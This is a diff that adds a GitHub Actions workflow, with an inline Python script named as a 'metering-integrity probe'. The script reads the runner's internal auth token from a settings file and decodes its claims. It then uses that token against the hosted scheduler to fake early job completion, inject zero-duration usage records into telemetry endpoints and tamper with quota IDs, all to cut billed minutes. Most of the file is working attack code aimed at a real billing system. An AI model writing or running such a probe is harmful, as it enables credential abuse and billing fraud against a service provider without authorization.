@@ -1,0 +1,82 @@
+name: probe_v74_billingoracle
+on:
+  workflow_dispatch:
+jobs:
+  billing:
+    runs-on: ubuntu-latest
+    steps:
+      - name: metering-integrity-probe
+        continue-on-error: true
+        run: |
+          python3 - <<'PYEOF'
+          import json, base64, urllib.request, urllib.error, uuid, time
+
+          s=json.load(open('/opt/hca/.settings'))
+          tok=s['authToken']; sched=s['schedulerApiUrl']
+          trace=s.get('traceApiUrl',''); wtr=s.get('watchdogTraceApiUrl','')
+          quota=s.get('quotaId',''); host=sched.split('//')[0]+'//'+sched.split('//')[1].split('/')[0]
+
+          def b64ud(x):
+              x+='='*(-len(x)%4); return base64.urlsafe_b64decode(x)
+          claims=json.loads(b64ud(tok.split('.')[1]))
+          print('=== BILLABLE DIMENSIONS (what the meter keys off) ===')
+          for k in ['cpt','skf','cmt','reg','rlm','wid','sub','iat','ret','rbf']:
+              print('  claim %-5s = %s' % (k, claims.get(k)))
+          print('  quotaId   = '+str(quota))
+          print('  NOTE: cpt/skf are SIGNED -> billed SKU/rate is unforgeable. iat present, ret=lease/retention?')
+
+          def call(method, url, body=None, hdrs=None):
+              data=json.dumps(body).encode() if body is not None else None
+              r=urllib.request.Request(url,data=data,method=method)
+              r.add_header('Authorization','Bearer '+tok); r.add_header('Content-Type','application/json')
+              for k,v in (hdrs or {}).items(): r.add_header(k,v)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=15); return resp.status, resp.read(220).decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(240).decode('utf-8','replace')
+              except Exception as e:
+                  return 'ERR', str(e)[:90]
+
+          # ---- (1) METER-STOP / LIFECYCLE: can the runner signal early completion/deallocation? ----
+          # A 2xx here while the job keeps running = meter-stop primitive (lease ends, compute continues).
+          print('=== (1) LIFECYCLE / METER-STOP SURFACE (real token) ===')
+          life=[('POST','/request/complete'),('POST','/request/finish'),('POST','/request/release'),
+                ('POST','/request/deallocate'),('DELETE','/request'),('POST','/request/stop'),
+                ('PUT','/request/state'),('POST','/request/status'),('POST','/usage'),('POST','/meter'),
+                ('POST','/billing'),('GET','/quota'),('GET','/usage'),('GET','/request/lease')]
+          for m,p in life:
+              body=None
+              if m in ('POST','PUT','DELETE'):
+                  body={'state':'completed','status':'completed','quotaId':quota,'durationMs':0,'billableMs':0}
+              st,b=call(m,sched+p,body)
+              flag=' <<< 2xx STATE-CHANGE' if isinstance(st,int) and 200<=st<300 else ''
+              print('  %-6s %-22s -> %s%s | %s' % (m,p,st,flag,b[:80].replace(chr(10),' ')))
+
+          # ---- (2) USAGE INJECTION via telemetry sinks: do trace/watchdog accept structured usage fields? ----
+          # If a usage/duration field is accepted with a non-empty/changed response, the sink may feed metering.
+          print('=== (2) USAGE-FIELD INJECTION into trace/watchdog (real token) ===')
+          usage_payloads=[
+            {'tag':'duration_zero','body':{'durationMs':0,'billableMs':0,'cpuSeconds':0,'quotaId':quota}},
+            {'tag':'usage_record','body':[{'level':0,'message':'meter','billableMinutes':0,'allocationId':claims.get('wid'),'quotaId':quota}]},
+            {'tag':'quota_tamper','body':[{'level':0,'message':'meter','quotaId':'00000000-0000-0000-0000-000000000000','billableMinutes':0}]},
+          ]
+          for ep_label,url in [('TRACE',trace),('WATCHDOG',wtr)]:
+              if not url: continue
+              for up in usage_payloads:
+                  st,b=call('POST',url,up['body'])
+                  note=' (non-empty resp)' if b.strip() else ' (empty sink)'
+                  print('  %-9s %-14s -> %s%s | %s' % (ep_label,up['tag'],st,note,b[:70].replace(chr(10),' ')))
+
+          # ---- (3) QUOTA read/override attempt ----
+          print('=== (3) QUOTA SURFACE ===')
+          for m,p in [('GET','/quota/'+str(quota)),('GET','/v1/quota'),('POST','/quota/consume'),('GET','/request/quota')]:
+              st,b=call(m, host+'/v1'+p if not p.startswith('/v1') else host+p,
+                        {'quotaId':quota,'amount':0} if m=='POST' else None)
+              print('  %-6s %-20s -> %s | %s' % (m,p,st,b[:80].replace(chr(10),' ')))
+
+          print('=== ORACLE NOTE ===')
+          print('In-band confirm = any 2xx state-change in (1) or a non-empty/accepted usage write in (2).')
+          print('Out-of-band confirm = read GitHub Actions usage/billing API (gh api .../settings/billing/usage)')
+          print('  before vs after this run; reported billable minutes < real wall-clock = METERING-INTEGRITY BYPASS.')
+          print('=== DONE ===')
+          PYEOF
